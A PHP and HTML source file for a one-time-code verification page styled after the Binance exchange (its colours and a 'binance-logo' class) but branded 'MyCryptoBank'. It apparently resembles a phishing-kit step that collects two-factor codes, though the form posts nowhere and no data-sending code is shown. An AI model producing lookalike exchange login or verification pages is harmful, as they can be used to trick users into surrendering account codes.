<?php
function mask_email_or_phone($input) {
    if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
        $parts = explode('@', $input);
        $name = $parts[0];
        $domain = $parts[1];
        $masked = substr($name, 0, 3) . str_repeat('*', max(0, strlen($name)-3));
        return $masked . '@' . $domain;
    } else {
        // Mask phone: show first 2 and last 2 digits only
        $len = strlen($input);
        if ($len <= 4) return str_repeat('*', $len);
        return substr($input, 0, 2) . str_repeat('*', $len-4) . substr($input, -2);
    }
}
$email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
$is_email = filter_var($email, FILTER_VALIDATE_EMAIL);
$masked = $email ? mask_email_or_phone($email) : '';
$heading = $is_email ? 'Email Verification' : 'Number Verification';
$desc = $is_email
    ? 'Enter the 6-digit verification code sent to <b>' . $masked . '</b>.'
    : 'Enter the 6-digit verification code sent to <b>' . $masked . '</b>.';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo $heading; ?></title>
  <style>
    body {
      font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
      background: #181A20;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .verify-container {
      background: #1E2329;
      border-radius: 24px;
      box-shadow: 0 0 16px 0 rgba(0,0,0,0.4);
      padding: 48px 36px 36px 36px;
      width: 100%;
      max-width: 420px;
      color: #fff;
      position: relative;
    }
    .binance-logo {
      display: flex;
      align-items: center;
      margin-bottom: 18px;
      justify-content: center;
    }
    .binance-logo img {
      height: 32px;
      width: 32px;
      margin-right: 8px;
      border-radius: 6px;
    }
    .binance-logo span {
      font-size: 22px;
      font-weight: 700;
      color: #F0B90B;
      letter-spacing: 1px;
    }
    .verify-container h2 {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #fff;
      text-align: left;
    }
    .verify-desc {
      color: #b7bdc6;
      font-size: 16px;
      margin-bottom: 28px;
      margin-left: 2px;
    }
    .form-group {
      margin-bottom: 18px;
    }
    .form-group label {
      display: block;
      font-size: 15px;
      margin-bottom: 6px;
      color: #fff;
      font-weight: 600;
    }
    .code-input-wrapper {
      position: relative;
      width: 100%;
    }
    .form-group input[type="text"] {
      width: 100%;
      padding: 13px 110px 13px 14px;
      font-size: 16px;
      border: 1.5px solid #353945;
      border-radius: 8px;
      background: #181A20;
      color: #fff;
      margin-bottom: 0;
      outline: none;
      transition: border-color 0.3s;
      box-sizing: border-box;
    }
    .form-group input[type="text"]:focus {
      border-color: #F0B90B;
    }
    .code-sent {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      color: #848E9C;
      font-size: 15px;
      display: flex;
      align-items: center;
      gap: 4px;
      background: none;
      border: none;
      cursor: pointer;
    }
    .verify-btn {
      width: 100%;
      padding: 15px 0;
      background: #F0B90B;
      color: #181A20;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 18px;
      transition: background 0.2s;
    }
    .verify-btn:hover {
      background: #e5a800;
    }
    .security-link {
      text-align: center;
      color: #F0B90B;
      font-size: 16px;
      font-weight: 600;
      margin-top: 10px;
      text-decoration: none;
      display: block;
    }
    .security-link:hover {
      text-decoration: underline;
    }
    @media (max-width: 768px) {
      .verify-container {
        max-width: 98vw;
        padding: 24px 8vw 20px 8vw;
        border-radius: 12px;
      }
      .binance-logo img {
        height: 26px;
        width: 26px;
      }
      .binance-logo span {
        font-size: 17px;
      }
      .verify-container h2 {
        font-size: 22px;
      }
      .verify-desc {
        font-size: 14px;
      }
      .verify-btn {
        font-size: 15px;
        padding: 10px 0;
        border-radius: 7px;
      }
      .security-link {
        font-size: 13px;
      }
      .form-group input[type="text"] {
        font-size: 14px;
        padding: 10px 90px 10px 10px;
      }
      .code-sent {
        font-size: 12px;
      }
    }
    @media (max-width: 480px) {
      .verify-container {
        padding: 10px 2vw 10px 2vw;
        border-radius: 0;
        min-width: unset;
        box-shadow: none;
      }
      .binance-logo img {
        height: 20px;
        width: 20px;
      }
      .binance-logo span {
        font-size: 13px;
      }
      .verify-container h2 {
        font-size: 16px;
        margin-bottom: 10px;
      }
      .verify-desc {
        font-size: 11px;
        margin-bottom: 12px;
      }
      .form-group label {
        font-size: 11px;
      }
      .form-group input[type="text"] {
        font-size: 12px;
        padding: 8px 60px 8px 8px;
        border-radius: 5px;
      }
      .verify-btn {
        font-size: 12px;
        padding: 8px 0;
        border-radius: 5px;
        margin-bottom: 10px;
      }
      .security-link {
        font-size: 11px;
        margin-top: 6px;
      }
      .code-sent {
        font-size: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="verify-container">
    <div class="binance-logo">
      <img src="./img/logo.jpg" alt="logo">
      <span>MyCryptoBank</span>
    </div>
    <h2><?php echo $heading; ?></h2>
    <div class="verify-desc">
      Enter the 6-digit verification code sent to <?php echo $is_email ? '<b>' . $masked . '</b>' : '<b>' . $masked . '</b>'; ?>.
    </div>
    <form action="#">
      <div class="form-group">
        <label for="code"><?php echo $is_email ? 'Email Verification Code' : 'Number Verification Code'; ?></label>
        <div class="code-input-wrapper">
          <input type="text" id="code" name="code" maxlength="6" autocomplete="off" required>
          <button class="code-sent" type="button" tabindex="-1" title="Code Sent" disabled>
            Code Sent
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" fill="none" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="#848E9C" stroke-width="2"/><path d="M12 8v4l2 2" stroke="#848E9C" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
          </button>
        </div>
      </div>
      <button class="verify-btn" type="submit">Submit</button>
    </form>
    <a href="#" class="security-link">Security verification unavailable?</a>
  </div>
</body>
</html> 